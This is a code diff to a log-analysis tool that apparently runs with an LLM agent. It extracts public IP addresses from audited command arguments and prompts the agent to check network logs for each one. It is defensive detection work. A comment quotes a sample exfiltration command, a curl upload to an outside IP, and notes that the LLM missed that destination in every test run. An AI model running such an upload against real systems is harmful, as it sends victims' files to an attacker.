@@ -31,6 +31,7 @@
 
 from __future__ import annotations
 
+import ipaddress
 import re
 from collections import Counter
 from typing import Any, Dict, List
@@ -51,6 +52,32 @@ SHELL_CMD_RE = re.compile(r"(^|/)(ba|da|z)?sh\b|\bsh -c\b")
 # 정상 운영 서버에서 늘 도는 시스템 명령. EC2 실측: 24시간 audit 3728건 중 "의심 명령" 245건이
 # 대부분 cron의 `sh -c`와 EC2 Instance Connect(sshd -o AuthorizedKeysCommand .../eic_run_authorized_keys)였다.
 BENIGN_CMD_RE = re.compile(r"/usr/share/ec2-instance-connect/|AuthorizedKeysCommand")
+# 명령 인자에 등장한 IPv4 (다운로드 주소, 유출 목적지, 역방향 셸 대상 등)
+IPV4_RE = re.compile(r"(?<![\d.])(\d{1,3}(?:\.\d{1,3}){3})(?![\d.])")
+# 관문이 network 확인을 요구하는 외부 IP 최대 개수 (등장 횟수 순). 수십 개면 도구 상한만 소모한다.
+MAX_EXTERNAL_IPS = 3
+
+
+def command_external_ips(records: List[Dict[str, Any]]) -> List[str]:
+    """명령 인자에 등장한 외부(공인) IP를 등장 횟수 순으로 돌려준다 (사설·루프백·링크로컬 제외).
+
+    로컬 유출 시나리오 변형(로그인 IP와 전송 목적지가 다름)에서 LLM이 audit의
+    `curl -T ... http://185.220.101.47/upload`를 보고도 그 IP로 network를 다시 조회하지 않고
+    끝냈다(3/3). 새 목적지의 Suricata 경보를 놓치지 않도록 코드가 뽑아 종료 관문 (f)에 넘긴다.
+    """
+    counts: Counter = Counter()
+    for r in records:
+        command = _command(r)
+        if BENIGN_CMD_RE.search(command):
+            continue
+        for candidate in IPV4_RE.findall(command):
+            try:
+                address = ipaddress.ip_address(candidate)
+            except ValueError:
+                continue
+            if address.is_global:
+                counts[candidate] += 1
+    return [ip for ip, _ in counts.most_common(MAX_EXTERNAL_IPS)]
 
 
 def _top(counter: Counter) -> str:
@@ -79,6 +106,7 @@ def audit_rule_check(records: List[Dict[str, Any]]) -> Dict[str, Any]:
         "suspicious": len(suspicious),
         "examples": [f"{r.get('user')}: {_command(r)[:80]} ({r.get('raw_ref')})"
                      for r in (web_suspicious or suspicious)[:3]],
+        "external_ips": command_external_ips(records),
     }
 
 
@@ -95,6 +123,9 @@ def _audit_stats(records: List[Dict[str, Any]], check: Dict[str, Any]) -> str:
         f"{check['suspicious']}건"
         + (f" — 예: {' / '.join(check['examples'])}" if check["examples"] else "")
         + ". (페이지와 무관한 전체 기준. 0건이 아니면 user나 pid로 다시 조회해 원본을 확인하십시오)"
+        + (f" [외부 통신 대상] 명령에 등장한 외부 IP: {', '.join(check['external_ips'])} — 다운로드·전송·역방향 셸 "
+           "대상일 수 있으니 종료 전에 fetch_network_log(ip=<IP>)로 각각 조회해 경보·통신을 확인하십시오."
+           if check["external_ips"] else "")
     )
 
 
